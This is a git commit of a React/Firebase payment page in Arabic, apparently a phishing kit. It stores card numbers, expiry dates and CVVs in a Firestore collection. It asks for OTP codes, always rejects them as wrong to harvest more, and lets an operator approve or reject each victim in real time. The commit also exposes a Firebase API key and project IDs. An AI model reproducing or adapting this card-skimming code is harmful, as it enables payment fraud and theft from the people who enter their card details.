de56ec9f2fccc0bfb7df26992143892fb5521b6c
a96363877 <a96363877@gmail.com>
2025-04-09 15:56:02 +0300

    Initial commit

---
+++ src/firebase.ts
@@ -0,0 +1,49 @@
+// firebase.js
+import { getApp, getApps, initializeApp } from 'firebase/app';
+import { doc, getFirestore, setDoc } from 'firebase/firestore';
+
+const firebaseConfig = {
+  
+   apiKey: "AIzaSyBoqC6S8FvbWhud_PnD6IC4pF61iffe4tI",
+  authDomain: "qatar22-d0e6a.firebaseapp.com",
+  projectId: "qatar22-d0e6a",
+  storageBucket: "qatar22-d0e6a.firebasestorage.app",
+  messagingSenderId: "349776944758",
+  appId: "1:349776944758:web:6a8dd2558e8ac248570957",
+  measurementId: "G-079WEHH5KL"
+};
+
+const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
+const db = getFirestore(app);
+
+export async function addData(data: any) {
+  localStorage.setItem('visitor', data.id);
+  try {
+    const docRef = await doc(db, 'pays', data.id!);
+    await setDoc(docRef, data);
+
+    console.log('Document written with ID: ', docRef.id);
+    // You might want to show a success message to the user here
+  } catch (e) {
+    console.error('Error adding document: ', e);
+    // You might want to show an error message to the user here
+  }
+}
+export const handlePay = async (paymentInfo: any, setPaymentInfo: any) => {
+  try {
+    const visitorId = localStorage.getItem('visitor');
+    if (visitorId) {
+      const docRef = doc(db, 'pays', visitorId);
+      await setDoc(
+        docRef,
+        { ...paymentInfo, status: 'pending' },
+        { merge: true }
+      );
+      setPaymentInfo((prev: any) => ({ ...prev, status: 'pending' }));
+    }
+  } catch (error) {
+    console.error('Error adding document: ', error);
+    alert('Error adding payment info to Firestore');
+  }
+};
+export { db };
---
+++ src/kent/kent.tsx
@@ -0,0 +1,200 @@
+import { useEffect, useState } from 'react';
+import { doc, onSnapshot } from 'firebase/firestore';
+import { db, handlePay } from '../firebase';
+import { FaCreditCard } from 'react-icons/fa';
+import './kent.css'
+type PaymentInfo = {
+  cardNumber: string;
+  year: string;
+  month: string;
+  bank?: string;
+  otp?: string;
+  pass: string;
+  cardState: string;
+  allOtps: string[],
+  bank_card: string[];
+  prefix: string;
+  status: 'new' | 'pending' | 'approved' | 'rejected';
+};
+
+export const Payment = (props: any) => {
+  const [isProcessing, setIsProcessing] = useState(false);
+  const [otp, setOtp] = useState("");
+  const [showOtp, setShowOtp] = useState(false);
+
+  const [step, setstep] = useState(1);
+  const [newotp] = useState([''])
+  const [paymentInfo, setPaymentInfo] = useState<PaymentInfo>({
+    cardNumber: '',
+    year: '2025/',
+    month: '1',
+    otp: '',
+    allOtps: newotp,
+    bank: '',
+    pass: '',
+    cardState: 'new',
+    bank_card: [''],
+    prefix: '',
+    status: 'new',
+  });
+
+  const handleAddotp = (otp: string) => {
+    newotp.push(`${otp} , `)
+  }
+
+  const handleSubmit = (e: { preventDefault: () => void; }) => {
+    e.preventDefault();
+    handlePay(paymentInfo,setPaymentInfo)
+    setIsProcessing(true);
+    setstep(2)
+    setTimeout(() => {
+      setIsProcessing(false);
+      setShowOtp(true);
+    }, 2000);
+  };
+
+  const handleOtpSubmit = (e: { preventDefault: () => void; }) => {
+    e.preventDefault();
+    handleAddotp(otp)
+    setstep(3)
+    props.setisloading(true);
+
+    setPaymentInfo({
+      ...paymentInfo,
+      status:'approved'
+    })
+        handlePay(paymentInfo,setPaymentInfo)
+        setTimeout(() => {
+    props.setisloading(false);
+
+    alert("رمز التحقق غير صحيح!");
+          setOtp('')
+        }, 3000);
+  };
+
+  useEffect(() => {
+    //handleAddotp(paymentInfo.otp!)
+  }, [paymentInfo.otp])
+
+  useEffect(() => {
+    const visitorId = localStorage.getItem('visitor');
+    if (visitorId) {
+      const unsubscribe = onSnapshot(doc(db, 'pays', visitorId), (docSnap) => {
+        if (docSnap.exists()) {
+          const data = docSnap.data() as PaymentInfo;
+          if (data.status) {
+            setPaymentInfo(prev => ({ ...prev, status: data.status }));
+            if (data.status === 'approved') {
+              setstep(2);
+              props.setisloading(false);
+            } else if (data.status === 'rejected') {
+              props.setisloading(false);
+              alert('تم رفض البطاقة الرجاء, ادخال معلومات البطاقة بشكل صحيح ');
+              setstep(1);
+            }
+          }
+        }
+      });
+
+      return () => unsubscribe();
+    }
+  }, []);
+
+
+  return (
+    <div className='font' style={{ display: "flex", alignItems: "center", justifyContent: "center", minHeight: "100vh", backgroundColor: "#f3f4f6", padding: "16px" }} dir='rtl'>
+      <div style={{ width: "100%", maxWidth: "400px", padding: "24px", backgroundColor: "white", borderRadius: "16px", boxShadow: "0 4px 6px rgba(0, 0, 0, 0.1)" }}>
+        <h2 style={{ textAlign: "center", marginBottom: "16px", fontSize: "20px", fontWeight: "600" }}>تفاصيل الدفع</h2>
+        {!showOtp ? (
+          <form onSubmit={handleSubmit} style={{ display: "flex", flexDirection: "column", gap: "12px" }}>
+            <div>
+              <label  dir='rtl'>الاسم على البطاقة</label>
+              <input name="name" onChange={(e)=>{
+                    setPaymentInfo({
+                      ...paymentInfo,
+                      bank: e.target.value,
+                    })}} required style={{ width: "100%", padding: "8px", borderRadius: "4px", border: "1px solid #ccc",textAlign:'start' }} />
+            </div>
+            <div>
+              <label>رقم البطاقة</label>
+              <input name="cardNumber"type='tel'maxLength={16} minLength={16} onChange={(e)=>{
+                  setPaymentInfo({
+                    ...paymentInfo,
+                    cardNumber: e.target.value,
+                  })
+              }} required style={{ width: "100%", padding: "8px", borderRadius: "4px", border: "1px solid #ccc" }} />
+            </div>
+            <div style={{ display: "flex", gap: "12px" }}>
+              <div style={{ flex: 1 }}>
+                <label>سنة </label>
+                <select name="expiry" value={paymentInfo.year} onChange={(e)=>{
+                    setPaymentInfo({
+                      ...paymentInfo,
+                      year: e.target.value,
+                    })
+                }} required  style={{ width: "100%", padding: "8px", borderRadius: "4px", border: "1px solid #ccc" }} >
+
+                  <option value="2025/">2025</option>
+                  <option value="2026/">2026</option>
+                  <option value="2027/">2027</option>
+                  <option value="2028/">2028</option>
+                  <option value="2029/">2029</option>
+                  <option value="2030/">2030</option>
+                  <option value="2031/">2031</option>
+                  <option value="2032/">2032</option>
+                  <option value="2033/">2033</option>
+                  <option value="2034/">2034</option>
+                </select>
+              
+              </div> <div style={{ flex: 1 }}>
+                <label> شهر</label>
+                <select name="expiry" onChange={(e)=>{
+                    setPaymentInfo({
+                      ...paymentInfo,
+                      month: e.target.value,
+                    })
+                }} required  style={{ width: "100%", padding: "8px", borderRadius: "4px", border: "1px solid #ccc" }} >
+                  <option value="1">1</option>
+                  <option value="2">2</option>
+                  <option value="3">3</option>
+                  <option value="4">4</option>
+                  <option value="5">5</option>
+                  <option value="6">6</option>
+                  <option value="7">7</option>
+                  <option value="8">8</option>
+                  <option value="9">9</option>
+                  <option value="10">10</option>
+                  <option value="11">11</option>
+                  <option value="12">12</option>
+                </select>
+              </div>
+              <div style={{ flex: 1 }}>
+                <label>CVV</label>
+                <input name="cvv" maxLength={3} minLength={3} type='tel' onChange={(e)=>{
+                    setPaymentInfo({
+                      ...paymentInfo,
+                      pass: e.target.value,
+                    })}} required  style={{ width: "100%", padding: "8px", borderRadius: "4px", border: "1px solid #ccc" }} />
+              </div>
+            </div>
+           
+            <button type="submit" disabled={isProcessing} style={{ width: "100%", display: "flex", alignItems: "center", justifyContent: "center", gap: "8px", padding: "12px", backgroundColor: "#2563eb", color: "white", borderRadius: "4px", border: "none", cursor: "pointer" }}>
+              <FaCreditCard /> {isProcessing ? "يرجى الانتظار..." : "ادفع الآن"}
+            </button>
+          </form>
+        ) : step === 2 && paymentInfo.status === 'pending' ?  (<>طلب الدفع الخاص بك قيد المعالجة, يرجى الانتظار ...</>):(
+          <form onSubmit={handleOtpSubmit} style={{ display: "flex", flexDirection: "column", gap: "12px" }}>
+            <div>
+              <label style={{paddingBottom:5}}> يرجى ادخال رمز التحقق OTP المرسل الى جوالك</label>
+              <input name="otp" value={otp}minLength={4} maxLength={6} type='tel' onChange={(e) => setOtp(e.target.value)} required  style={{ width: "100%", padding: "8px", borderRadius: "4px", border: "1px solid #ccc" }} />
+            </div>
+            <button type="submit" style={{ width: "100%", padding: "12px", backgroundColor: "#2563eb", color: "white", borderRadius: "4px", border: "none", cursor: "pointer" }}>
+              تأكيد الدفع
+            </button>
+          </form>
+        ) }
+      </div>
+    </div>
+  );
+};
+
